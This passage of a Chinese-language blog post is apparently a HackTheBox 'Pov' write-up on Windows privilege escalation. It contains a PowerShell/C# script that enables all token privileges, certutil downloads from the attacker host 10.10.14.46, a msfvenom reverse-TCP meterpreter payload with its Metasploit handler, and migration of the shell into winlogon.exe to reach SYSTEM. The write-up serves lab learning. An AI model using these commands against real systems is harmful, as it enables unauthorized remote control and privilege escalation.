class="line">&#123;</span><br><span class="line">    public class SetTokenPriv</span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,</span><br><span class="line">        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, Pack = 1)]</span><br><span class="line">        internal struct TokPriv1Luid</span><br><span class="line">        &#123;</span><br><span class="line">            public int Count;</span><br><span class="line">            public long Luid;</span><br><span class="line">            public int Attr;</span><br><span class="line">        &#125;</span><br><span class="line">        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;</span><br><span class="line">        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;</span><br><span class="line">        internal const int TOKEN_QUERY = 0x00000008;</span><br><span class="line">        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;</span><br><span class="line">        public static void EnablePrivilege()</span><br><span class="line">        &#123;</span><br><span class="line">            bool retVal;</span><br><span class="line">            TokPriv1Luid tp;</span><br><span class="line">            IntPtr hproc = new IntPtr();</span><br><span class="line">            hproc = Process.GetCurrentProcess().Handle;</span><br><span class="line">            IntPtr htok = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; privs = new List&lt;string&gt;() &#123;  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,</span><br><span class="line">            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,</span><br><span class="line">            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,</span><br><span class="line">            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,</span><br><span class="line">            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,</span><br><span class="line">            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,</span><br><span class="line">            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,</span><br><span class="line">            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,</span><br><span class="line">            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,</span><br><span class="line">            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,</span><br><span class="line">            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);</span><br><span class="line">            tp.Count = 1;</span><br><span class="line">            tp.Luid = 0;</span><br><span class="line">            tp.Attr = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">            foreach (var priv in privs)</span><br><span class="line">            &#123;</span><br><span class="line">                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);</span><br><span class="line">                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$type = Add-Type $definition -PassThru</span><br><span class="line">$type[0]::EnablePrivilege() 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>在本地开启http服务上传该脚本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/EnableAllTokenPrivs.ps1</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>.\EnableAllTokenPrivs.ps1</code>即可</p>
+<p>回到题目，我们利用msf先在本地生成马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=5555 -f exe &gt; exploit.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后本地开启http服务，上传到靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/exploit.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Pov-HackTheBox/image-20240405203424722.png"></p>
+<p>在本地启动一个msf数据库&amp;console</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>接着依次执行去反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.46</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>开启监听后在靶机运行<code>.\exploit.exe</code>，反弹成功</p>
+<p><img src="/article/Pov-HackTheBox/image-20240406124840953.png"></p>
+<p>我们<code>ps</code>查看下靶机正在运行的进程，注意到<code>winlogon.exe</code>文件</p>
+<blockquote>
+<p>winlogon.exe 是 Windows 的登录系统进程，它在用户登录时启动，并处理用户登录和注销的过程。当用户输入用户名和密码后，winlogon.exe 验证用户的凭据，并启动用户环境。它还负责加载用户配置文件、启动用户的用户界面和其他关联的系统任务。</p>
+</blockquote>
+<p><img src="/article/Pov-HackTheBox/image-20240406125030326.png"></p>
+<p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
+<p>执行shell命令，成功提权拿到flag</p>
+<p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Monitored-HackTheBox.html" rel="prev" title="Monitored">
+      <i class="fa fa-chevron-left"></i> Monitored
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html" rel="next" title="Jenkins文件读取漏洞(CVE-2024-23897)">
+      Jenkins文件读取漏洞(CVE-2024-23897) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pov"><span class="nav-number">1.</span> <span class="nav-text">Pov</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
